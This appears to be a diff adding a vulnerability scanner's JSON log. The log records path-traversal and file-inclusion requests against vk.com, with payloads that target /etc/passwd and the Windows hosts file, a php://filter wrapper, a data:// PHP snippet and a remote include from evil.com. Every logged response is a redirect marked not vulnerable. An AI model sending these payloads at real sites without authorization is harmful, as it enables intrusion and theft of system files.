+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:46.098Z",
+        "duration": 102
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "f8c7f24f41d2a61d",
+      "target": "vk.com",
+      "payload": "../../../etc/passwd",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?file=..%2F..%2F..%2Fetc%2Fpasswd",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:46.099Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:46 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Sat, 15 May 2027 10:52:45 GMT; path=/; domain=.vk.com",
+            "remixstlid=9067670511810711908_sKAImzgsuUR7LV5FZUqeeCuzPApnAe8CAkeSP40WVjc; expires=Sun, 09 May 2027 11:22:46 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "URRyWyI6lgg2QIWKO07VL-_uaryUBg",
+          "server-timing": "tid;desc=\"URRyWyI6lgg2QIWKO07VL-_uaryUBg\",front;dur=8.571"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:46.199Z",
+        "duration": 100
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "8acc78fd8856e55f",
+      "target": "vk.com",
+      "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?file=..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:46.199Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:46 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Fri, 07 May 2027 10:48:21 GMT; path=/; domain=.vk.com",
+            "remixstlid=9063166912183429530_sDnQy5zoM5HQM7XyQxx3qjhoR50jq0JMcLz49primRX; expires=Sun, 09 May 2027 11:22:46 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "VCpLZUMmc8W__HySM9EljjnKJ3Jm8Q",
+          "server-timing": "tid;desc=\"VCpLZUMmc8W__HySM9EljjnKJ3Jm8Q\",front;dur=8.163"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:46.296Z",
+        "duration": 97
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "b97d2cfc4c280394",
+      "target": "vk.com",
+      "payload": "....//....//....//etc/passwd",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?file=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:46.296Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:46 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Wed, 12 May 2027 14:39:43 GMT; path=/; domain=.vk.com",
+            "remixstlid=9057678150137669886_05PhuvFhDmAWAk7fZqa9uUkjC8lJqnnJ9yHq7Z8uoeD; expires=Sun, 09 May 2027 11:22:46 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "P-1PcwvrtAXEA5MjuyZVkk2dvcWVgg",
+          "server-timing": "tid;desc=\"P-1PcwvrtAXEA5MjuyZVkk2dvcWVgg\",front;dur=9.684"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:46.409Z",
+        "duration": 113
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "bf5b2e5e52e19d6b",
+      "target": "vk.com",
+      "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:46.409Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:46 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Thu, 06 May 2027 01:51:18 GMT; path=/; domain=.vk.com",
+            "remixstlid=9058100362602849658_vtsmTyZ2cc7NzBZ3QOqRxUs2vEYRSR7cHuyZwar0lUg; expires=Sun, 09 May 2027 11:22:46 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "7OX3UDxwWAlIeOnmY2h89paZVki3Ug",
+          "server-timing": "tid;desc=\"7OX3UDxwWAlIeOnmY2h89paZVki3Ug\",front;dur=7.994"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:46.499Z",
+        "duration": 90
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "1aca3a25353250ae",
+      "target": "vk.com",
+      "payload": "http://evil.com/evil.txt",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?page=http%3A%2F%2Fevil.com%2Fevil.txt",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:46.499Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:46 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Sat, 15 May 2027 21:11:34 GMT; path=/; domain=.vk.com",
+            "remixstlid=9111017658224541270_DZ7Q1O7pNWHqxtaLIYBZG6Y0ipGBCKRYOICgQ9a4ix0; expires=Sun, 09 May 2027 11:22:46 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "g0gZ705e7NkF5WHBWF0_RaPk17xgXw",
+          "server-timing": "tid;desc=\"g0gZ705e7NkF5WHBWF0_RaPk17xgXw\",front;dur=8.183"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:46.596Z",
+        "duration": 97
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "b77c4842224f9263",
+      "target": "vk.com",
+      "payload": "/etc/passwd",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?page=%2Fetc%2Fpasswd",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:46.597Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:46 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Wed, 05 May 2027 22:48:28 GMT; path=/; domain=.vk.com",
+            "remixstlid=9121010019897867644_zYyuWh2leF1eHZjVslGu3UvxX4NiOdDJVIpBsrkKM7D; expires=Sun, 09 May 2027 11:22:46 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "TbVaZPIwhEhKGaUnUK4JQB5xuWgnyw",
+          "server-timing": "tid;desc=\"TbVaZPIwhEhKGaUnUK4JQB5xuWgnyw\",front;dur=8.243"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:46.696Z",
+        "duration": 99
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "a9326a0ef97405ab",
+      "target": "vk.com",
+      "payload": "php://filter/resource",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?page=php%3A%2F%2Ffilter%2Fresource",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:46.696Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:46 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Tue, 04 May 2027 23:22:10 GMT; path=/; domain=.vk.com",
+            "remixstlid=9067670511811296443_pZDj9ZINlF6bZVrzfmSTfoJDHwiIThTWfFEFAcek1vk; expires=Sun, 09 May 2027 11:22:46 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "deVP_IZ9E0Z3qsZkQ4s1M4VMXFv5mw",
+          "server-timing": "tid;desc=\"deVP_IZ9E0Z3qsZkQ4s1M4VMXFv5mw\",front;dur=7.553"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:46.796Z",
+        "duration": 100
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    },
+    {
+      "traceId": "58131f76e8349f35",
+      "target": "vk.com",
+      "payload": "data://text/plain;base64,PD9waHAgcGhvc3RlcmUgaW4=",
+      "request": {
+        "method": "GET",
+        "url": "vk.com/?page=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgcGhvc3RlcmUgaW4%3D",
+        "headers": {
+          "User-Agent": "VULNTRACE/1.0 - Authorized Security Testing",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "timestamp": "2026-05-09T11:22:46.796Z"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "server": "kittenx",
+          "date": "Sat, 09 May 2026 11:22:46 GMT",
+          "content-type": "text/html; charset=windows-1251",
+          "content-length": "20",
+          "connection": "keep-alive",
+          "x-powered-by": "KPHP/7.4.126624",
+          "set-cookie": [
+            "remixir=DELETED; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/; domain=.vk.com; secure; HttpOnly",
+            "remixlang=3; expires=Fri, 07 May 2027 16:03:28 GMT; path=/; domain=.vk.com",
+            "remixstlid=9077381398507916735_BZAziZznOzoZXN3weYtzCtfn7RyBvtpdcmjJs5FeKBo; expires=Sun, 09 May 2027 11:22:46 GMT; path=/; domain=.vk.com; secure"
+          ],
+          "location": "https://m.vk.com/",
+          "content-encoding": "gzip",
+          "strict-transport-security": "max-age=15768000",
+          "nel": "{\"report_to\":\"default\",\"max_age\":86400,\"include_subdomains\":true,\"failure_fraction\":1.0}",
+          "report-to": "{\"group\":\"default\",\"max_age\":86400,\"endpoints\":[{\"url\":\"https://akashi.vk-portal.net/api/v1/nel\"}],\"include_subdomains\":true}",
+          "x-frontend": "front656002",
+          "access-control-expose-headers": "X-Frontend",
+          "x-trace-id": "Q_qrS3RXufEd6rvl4XJ_KUA2Tmu8kw",
+          "server-timing": "tid;desc=\"Q_qrS3RXufEd6rvl4XJ_KUA2Tmu8kw\",front;dur=8.703"
+        },
+        "body": "\u001f�\b\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0003\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000",
+        "timestamp": "2026-05-09T11:22:46.896Z",
+        "duration": 100
+      },
+      "evidence": [],
+      "classification": {
+        "vulnerable": false,
+        "vulnerability": null,
+        "confidence": 0,
+        "cwe": null,
+        "severity": null
+      }
+    }
+  ]
+}
